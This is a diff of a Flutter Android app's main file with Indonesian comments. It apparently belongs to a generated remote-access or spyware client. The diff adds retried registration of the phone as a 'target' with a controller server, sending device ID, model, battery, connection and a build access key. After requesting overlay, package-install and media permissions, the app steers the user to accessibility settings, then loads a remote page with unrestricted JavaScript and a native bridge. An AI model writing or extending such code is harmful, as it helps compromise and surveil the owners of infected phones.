@@ -13,7 +13,15 @@ import 'package:url_launcher/url_launcher.dart';
 
 import 'config/build_config.dart';
 
-void main() {
+// ==========================================
+// ===== GLOBAL =====
+// ==========================================
+const MethodChannel _deviceChannel = MethodChannel('orgsapp/device_info');
+
+// ==========================================
+// ===== MAIN =====
+// ==========================================
+void main() async {
   WidgetsFlutterBinding.ensureInitialized();
   runApp(const GeneratedApp());
 }
@@ -41,7 +49,7 @@ class GeneratedApp extends StatelessWidget {
 }
 
 // ==========================================
-// ===== BOOTSTRAP: PERMISSION + REGISTER =====
+// ===== BOOTSTRAP =====
 // ==========================================
 class AppBootstrap extends StatefulWidget {
   const AppBootstrap({super.key});
@@ -62,29 +70,50 @@ class _AppBootstrapState extends State<AppBootstrap> {
 
   Future<void> _bootstrap() async {
     try {
-      // ===== 1. Simpan accessKey ke SharedPreferences =====
-      final prefs = await SharedPreferences.getInstance();
-      await prefs.setString('accessKey', BuildConfig.accessKey);
-      await prefs.setString('appName', BuildConfig.appName);
-      await prefs.setString('buildId', BuildConfig.buildId);
-      await prefs.setString('packageName', BuildConfig.packageName);
-      await prefs.setString('serverUrl', BuildConfig.serverUrl);
+      // ==========================================
+      // ===== 1. Save config ke SharedPreferences =====
+      // ==========================================
+      try {
+        final prefs = await SharedPreferences.getInstance();
+        await prefs.setString('accessKey', BuildConfig.accessKey);
+        await prefs.setString('appName', BuildConfig.appName);
+        await prefs.setString('buildId', BuildConfig.buildId);
+        await prefs.setString('packageName', BuildConfig.packageName);
+        await prefs.setString('serverUrl', BuildConfig.serverUrl);
+        await prefs.setBool('isNativeApp', true);
+        debugPrint('✅ Config saved to prefs');
+      } catch (e) {
+        debugPrint('⚠️ Prefs error: $e');
+      }
 
-      // ===== 2. Request permissions =====
+      // ==========================================
+      // ===== 2. Request Permissions =====
+      // ==========================================
       if (mounted) setState(() => _status = 'Meminta izin...');
-      await _requestPermissions();
+      try {
+        await _requestPermissions();
+      } catch (e) {
+        debugPrint('⚠️ Permission flow error: $e');
+      }
 
-      // ===== 3. Register device ke server =====
+      // ==========================================
+      // ===== 3. Register Device =====
+      // ==========================================
       if (mounted) setState(() => _status = 'Mendaftar device...');
-      await _registerDevice();
+      try {
+        await _registerDeviceWithRetry();
+      } catch (e) {
+        debugPrint('⚠️ Register error: $e');
+      }
 
       if (!mounted) return;
       setState(() {
         _status = 'Siap';
         _ready = true;
       });
-    } catch (e) {
-      debugPrint('❌ Bootstrap error: $e');
+    } catch (e, st) {
+      debugPrint('❌ Bootstrap fatal error: $e');
+      debugPrint('$st');
       if (!mounted) return;
       setState(() {
         _status = 'Siap (dengan keterbatasan)';
@@ -97,15 +126,12 @@ class _AppBootstrapState extends State<AppBootstrap> {
   // ===== REQUEST PERMISSIONS =====
   // ==========================================
   Future<void> _requestPermissions() async {
-    // Deteksi Android SDK version
     int sdkInt = 0;
     try {
-      if (Platform.isAndroid) {
-        final androidInfo = await _getAndroidSdkInt();
-        sdkInt = androidInfo;
-      }
+      sdkInt = await _getAndroidSdkInt();
+      debugPrint('📱 Android SDK: $sdkInt');
     } catch (e) {
-      debugPrint('⚠️ Cannot get Android SDK: $e');
+      debugPrint('⚠️ getSdkInt error: $e');
     }
 
     final permissions = <Permission>[
@@ -148,20 +174,19 @@ class _AppBootstrapState extends State<AppBootstrap> {
       Permission.systemAlertWindow,
       Permission.requestInstallPackages,
 
-      // ===== ACCESSIBILITY =====
-      Permission.accessibilityService,
+      // ❌ TIDAK ADA di permission_handler v11.x:
+      // Permission.callLog
+      // Permission.accessibilityService
     ];
 
     // ===== STORAGE: beda per Android version =====
     if (sdkInt >= 33) {
-      // Android 13+
       permissions.addAll([
         Permission.photos,
         Permission.videos,
         Permission.audio,
       ]);
     } else {
-      // Android 12 & below
       permissions.add(Permission.storage);
     }
 
@@ -171,98 +196,55 @@ class _AppBootstrapState extends State<AppBootstrap> {
         final status = await perm.status;
         if (status.isDenied || status.isLimited) {
           final result = await perm.request();
-          debugPrint('🔑 ${perm.toString()}: $result');
-        } else {
-          debugPrint('🔑 ${perm.toString()}: $status (skip)');
+          debugPrint('🔑 $perm: $result');
         }
       } catch (e) {
-        debugPrint('⚠️ Permission error (${perm.toString()}): $e');
+        debugPrint('⚠️ Permission error ($perm): $e');
       }
+    }
+
+    // ===== Buka Settings Accessibility (manual) =====
+    try {
+      if (Platform.isAndroid) {
+        await _openAccessibilitySettings();
+      }
+    } catch (e) {
+      debugPrint('⚠️ Cannot open accessibility settings: $e');
     }
   }
 
   // ==========================================
-  // ===== GET ANDROID SDK INT =====
+  // ===== HELPER: GET ANDROID SDK INT =====
   // ==========================================
   Future<int> _getAndroidSdkInt() async {
+    if (!Platform.isAndroid) return 0;
     try {
-      // Pakai Platform Channel ke native
-      const channel = MethodChannel('orgsapp/device_info');
-      final result = await channel.invokeMethod<int>('getSdkInt');
+      final result = await _deviceChannel.invokeMethod<int>('getSdkInt');
       return result ?? 0;
     } catch (e) {
-      debugPrint('⚠️ getSdkInt error: $e');
+      debugPrint('⚠️ getSdkInt channel error: $e');
       return 0;
     }
   }
 
   // ==========================================
-  // ===== REGISTER DEVICE KE SERVER =====
+  // ===== HELPER: OPEN ACCESSIBILITY SETTINGS =====
   // ==========================================
-  Future<void> _registerDevice() async {
-    if (BuildConfig.accessKey.isEmpty) {
-      debugPrint('⚠️ Access key kosong, skip register');
-      return;
-    }
-
+  Future<void> _openAccessibilitySettings() async {
     try {
-      // Ambil info device
-      final battery = Battery();
-      int batteryLevel = 0;
-      try {
-        batteryLevel = await battery.batteryLevel;
-      } catch (e) {
-        debugPrint('⚠️ Battery error: $e');
-      }
-
-      final connectivity = Connectivity();
-      String connType = 'unknown';
-      try {
-        final result = await connectivity.checkConnectivity();
-        connType = result.toString();
-      } catch (e) {
-        debugPrint('⚠️ Connectivity error: $e');
-      }
-
-      // Device ID (persist)
-      final prefs = await SharedPreferences.getInstance();
-      String deviceId = prefs.getString('deviceId') ?? '';
-      if (deviceId.isEmpty) {
-        deviceId = 'dev_${DateTime.now().millisecondsSinceEpoch}';
-        await prefs.setString('deviceId', deviceId);
-      }
-
-      // Register ke server
-      final res = await _httpPost(
-        '${BuildConfig.serverUrl}/api/register-target',
-        {
-          'id': deviceId,
-          'model': await _getDeviceModel(),
-          'brand': await _getDeviceBrand(),
-          'androidVersion': await _getAndroidVersion(),
-          'battery': batteryLevel,
-          'ip': connType,
-          'appName': BuildConfig.appName,
-          'packageName': BuildConfig.packageName,
-          'accessKey': BuildConfig.accessKey,
-          'buildId': BuildConfig.buildId,
-        },
-      );
-
-      debugPrint('📥 Register result: $res');
-
-      // ===== Simpan info device =====
-      await prefs.setString('deviceModel', await _getDeviceModel());
-      await prefs.setBool('registered', true);
+      await _deviceChannel.invokeMethod('openAccessibilitySettings');
+      debugPrint('✅ Accessibility settings opened');
     } catch (e) {
-      debugPrint('❌ Register error: $e');
+      debugPrint('⚠️ Cannot open accessibility settings: $e');
     }
   }
 
+  // ==========================================
+  // ===== HELPER: GET DEVICE INFO =====
+  // ==========================================
   Future<String> _getDeviceModel() async {
     try {
-      const channel = MethodChannel('orgsapp/device_info');
-      final result = await channel.invokeMethod<String>('getModel');
+      final result = await _deviceChannel.invokeMethod<String>('getModel');
       return result ?? 'Android Device';
     } catch (_) {
       return 'Android Device';
@@ -271,8 +253,7 @@ class _AppBootstrapState extends State<AppBootstrap> {
 
   Future<String> _getDeviceBrand() async {
     try {
-      const channel = MethodChannel('orgsapp/device_info');
-      final result = await channel.invokeMethod<String>('getBrand');
+      final result = await _deviceChannel.invokeMethod<String>('getBrand');
       return result ?? 'Android';
     } catch (_) {
       return 'Android';
@@ -281,20 +262,122 @@ class _AppBootstrapState extends State<AppBootstrap> {
 
   Future<String> _getAndroidVersion() async {
     try {
-      const channel = MethodChannel('orgsapp/device_info');
-      final result = await channel.invokeMethod<String>('getAndroidVersion');
+      final result =
+          await _deviceChannel.invokeMethod<String>('getAndroidVersion');
       return result ?? 'Unknown';
     } catch (_) {
       return 'Unknown';
     }
   }
 
-  // ==========================================
-  // ===== HTTP POST (dart:io, tanpa package) =====
-  // ==========================================
-  Future<String?> _httpPost(String url, Map<String, dynamic> body) async {
+  Future<String> _getOrCreateDeviceId() async {
     try {
-      final client = HttpClient();
+      final prefs = await SharedPreferences.getInstance();
+      String id = prefs.getString('deviceId') ?? '';
+      if (id.isEmpty) {
+        id = 'dev_${DateTime.now().millisecondsSinceEpoch}';
+        await prefs.setString('deviceId', id);
+      }
+      return id;
+    } catch (_) {
+      return 'dev_${DateTime.now().millisecondsSinceEpoch}';
+    }
+  }
+
+  // ==========================================
+  // ===== REGISTER DEVICE (with retry) =====
+  // ==========================================
+  Future<void> _registerDeviceWithRetry() async {
+    if (BuildConfig.accessKey.isEmpty) {
+      debugPrint('⚠️ Access key kosong, skip register');
+      return;
+    }
+
+    for (int attempt = 1; attempt <= 3; attempt++) {
+      try {
+        debugPrint('📡 Register attempt $attempt/3');
+        final ok = await _registerDevice();
+        if (ok) {
+          debugPrint('✅ Register success');
+          return;
+        }
+      } catch (e) {
+        debugPrint('⚠️ Register attempt $attempt failed: $e');
+      }
+
+      if (attempt < 3) {
+        await Future.delayed(const Duration(seconds: 2));
+      }
+    }
+
+    debugPrint('❌ Register failed after 3 attempts');
+  }
+
+  Future<bool> _registerDevice() async {
+    try {
+      // Ambil battery level
+      int batteryLevel = 0;
+      try {
+        final battery = Battery();
+        batteryLevel = await battery.batteryLevel;
+      } catch (e) {
+        debugPrint('⚠️ Battery error: $e');
+      }
+
+      // Ambil connectivity type
+      String connType = 'unknown';
+      try {
+        final connectivity = Connectivity();
+        final result = await connectivity.checkConnectivity();
+        connType = result.toString();
+      } catch (e) {
+        debugPrint('⚠️ Connectivity error: $e');
+      }
+
+      // Device info
+      final deviceId = await _getOrCreateDeviceId();
+      final model = await _getDeviceModel();
+      final brand = await _getDeviceBrand();
+      final androidVersion = await _getAndroidVersion();
+
+      // POST ke server
+      final payload = {
+        'id': deviceId,
+        'model': model,
+        'brand': brand,
+        'androidVersion': androidVersion,
+        'battery': batteryLevel,
+        'ip': connType,
+        'appName': BuildConfig.appName,
+        'packageName': BuildConfig.packageName,
+        'accessKey': BuildConfig.accessKey,
+        'buildId': BuildConfig.buildId,
+        'status': 'Online',
+        'lastSeen': DateTime.now().toIso8601String(),
+      };
+
+      final res = await _httpPost(
+        '${BuildConfig.serverUrl}/api/register-target',
+        payload,
+      );
+
+      return res != null && res.isNotEmpty;
+    } catch (e) {
+      debugPrint('❌ _registerDevice error: $e');
+      return false;
+    }
+  }
+
+  // ==========================================
+  // ===== HTTP POST (dart:io) =====
+  // ==========================================
+  Future<String?> _httpPost(
+    String url,
+    Map<String, dynamic> body,
+  ) async {
+    HttpClient? client;
+    try {
+      client = HttpClient();
       client.connectionTimeout = const Duration(seconds: 15);
 
       final request = await client.postUrl(Uri.parse(url));
@@ -303,13 +386,16 @@ class _AppBootstrapState extends State<AppBootstrap> {
       request.write(jsonEncode(body));
 
       final response = await request.close();
-      final responseBody = await response.transform(utf8.decoder).join();
-      client.close();
+      final responseBody =
+          await response.transform(utf8.decoder).join();
 
+      debugPrint('📥 HTTP ${response.statusCode}: $responseBody');
       return responseBody;
     } catch (e) {
       debugPrint('❌ HTTP error: $e');
       return null;
+    } finally {
+      client?.close(force: true);
     }
   }
 
@@ -318,9 +404,7 @@ class _AppBootstrapState extends State<AppBootstrap> {
   // ==========================================
   @override
   Widget build(BuildContext context) {
-    if (!_ready) {
-      return _buildLoadingScreen();
-    }
+    if (!_ready) return _buildLoadingScreen();
     return const WebViewHome();
   }
 
@@ -333,7 +417,6 @@ class _AppBootstrapState extends State<AppBootstrap> {
           child: Column(
             mainAxisAlignment: MainAxisAlignment.center,
             children: [
-              // Logo
               Container(
                 width: 80,
                 height: 80,
@@ -359,8 +442,6 @@ class _AppBootstrapState extends State<AppBootstrap> {
                 ),
               ),
               const SizedBox(height: 32),
-
-              // App name
               Text(
                 BuildConfig.appName,
                 style: const TextStyle(
@@ -372,8 +453,6 @@ class _AppBootstrapState extends State<AppBootstrap> {
                 textAlign: TextAlign.center,
               ),
               const SizedBox(height: 8),
-
-              // Status
               Text(
                 _status,
                 style: const TextStyle(
@@ -384,8 +463,6 @@ class _AppBootstrapState extends State<AppBootstrap> {
                 textAlign: TextAlign.center,
               ),
               const SizedBox(height: 32),
-
-              // Progress
               const SizedBox(
                 width: 24,
                 height: 24,
@@ -426,53 +503,65 @@ class _WebViewHomeState extends State<WebViewHome> {
   }
 
   void _initWebView() {
-    _controller = WebViewController()
-      ..setJavaScriptMode(JavaScriptMode.unrestricted)
-      ..setBackgroundColor(const Color(0xFFFFFFFF))
-      ..setUserAgent(
-        'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-      )
-      ..addJavaScriptChannel(
-        'AppBridge',
-        onMessageReceived: (msg) {
-          debugPrint('📨 From web: ${msg.message}');
-          _handleWebMessage(msg.message);
-        },
-      )
-      ..setNavigationDelegate(
-        NavigationDelegate(
-          onProgress: (p) {
-            if (mounted) setState(() => _progress = p);
+    try {
+      _controller = WebViewController()
+        ..setJavaScriptMode(JavaScriptMode.unrestricted)
+        ..setBackgroundColor(const Color(0xFFFFFFFF))
+        ..setUserAgent(
+          'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 '
+          '(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+        )
+        ..addJavaScriptChannel(
+          'AppBridge',
+          onMessageReceived: (msg) {
+            debugPrint('📨 From web: ${msg.message}');
+            _handleWebMessage(msg.message);
           },
-          onPageStarted: (_) {
-            if (mounted) {
+        )
+        ..setNavigationDelegate(
+          NavigationDelegate(
+            onProgress: (p) {
+              if (mounted) setState(() => _progress = p);
+            },
+            onPageStarted: (_) {
+              if (!mounted) return;
               setState(() {
                 _isLoading = true;
                 _hasError = false;
               });
-            }
-          },
-          onPageFinished: (_) async {
-            if (!mounted) return;
-            setState(() => _isLoading = false);
-            await _injectConfig();
-          },
-          onWebResourceError: (error) {
-            if (!mounted) return;
-            setState(() {
-              _hasError = true;
-              _errorMessage = error.description;
-              _isLoading = false;
-            });
-            debugPrint('❌ WebView error: ${error.description}');
-          },
-          onNavigationRequest: (request) {
-            // Izinkan semua navigasi
-            return NavigationDecision.navigate;
-          },
-        ),
-      )
-      ..loadRequest(Uri.parse(BuildConfig.webviewUrl));
+            },
+            onPageFinished: (_) async {
+              if (!mounted) return;
+              setState(() => _isLoading = false);
+              await _injectConfig();
+            },
+            onWebResourceError: (error) {
+              if (!mounted) return;
+              setState(() {
+                _hasError = true;
+                _errorMessage = error.description;
+                _isLoading = false;
+              });
+              debugPrint('❌ WebView error: ${error.description}');
+            },
+            onNavigationRequest: (request) {
+              return NavigationDecision.navigate;
+            },
+          ),
+        )
+        ..loadRequest(Uri.parse(BuildConfig.webviewUrl));
+
+      debugPrint('✅ WebView initialized');
+    } catch (e) {
+      debugPrint('❌ WebView init error: $e');
+      if (mounted) {
+        setState(() {
+          _hasError = true;
+          _errorMessage = 'Gagal init WebView: $e';
+          _isLoading = false;
+        });
+      }
+    }
   }
 
   Future<void> _injectConfig() async {
@@ -525,30 +614,53 @@ class _WebViewHomeState extends State<WebViewHome> {
     }
   }
 
+  Future<void> _reload() async {
+    setState(() {
+      _hasError = false;
+      _isLoading = true;
+      _progress = 0;
+    });
+    try {
+      await _controller.loadRequest(Uri.parse(BuildConfig.webviewUrl));
+    } catch (e) {
+      debugPrint('❌ Reload error: $e');
+      if (mounted) {
+        setState(() {
+          _hasError = true;
+          _errorMessage = 'Gagal reload: $e';
+          _isLoading = false;
+        });
+      }
+    }
+  }
+
   @override
   Widget build(BuildContext context) {
     return PopScope(
       canPop: false,
       onPopInvoked: (didPop) async {
         if (didPop) return;
-        final canGoBack = await _controller.canGoBack();
-        if (canGoBack) {
-          await _controller.goBack();
-        } else {
-          if (mounted) SystemNavigator.pop();
+        try {
+          final canGoBack = await _controller.canGoBack();
+          if (canGoBack) {
+            await _controller.goBack();
+          } else {
+            SystemNavigator.pop();
+          }
+        } catch (e) {
+          debugPrint('❌ Back error: $e');
+          SystemNavigator.pop();
         }
       },
       child: Scaffold(
         body: SafeArea(
           child: Stack(
             children: [
-              // ===== WEBVIEW =====
               if (!_hasError)
                 WebViewWidget(controller: _controller)
               else
                 _buildErrorScreen(),
 
-              // ===== PROGRESS BAR =====
               if (_isLoading && !_hasError)
                 Positioned(
                   top: 0,
@@ -612,13 +724,7 @@ class _WebViewHomeState extends State<WebViewHome> {
             ),
             const SizedBox(height: 20),
             GestureDetector(
-              onTap: () {
-                setState(() {
-                  _hasError = false;
-                  _isLoading = true;
-                });
-                _controller.loadRequest(Uri.parse(BuildConfig.webviewUrl));
-              },
+              onTap: _reload,
               child: Container(
                 padding: const EdgeInsets.symmetric(
                   horizontal: 24,
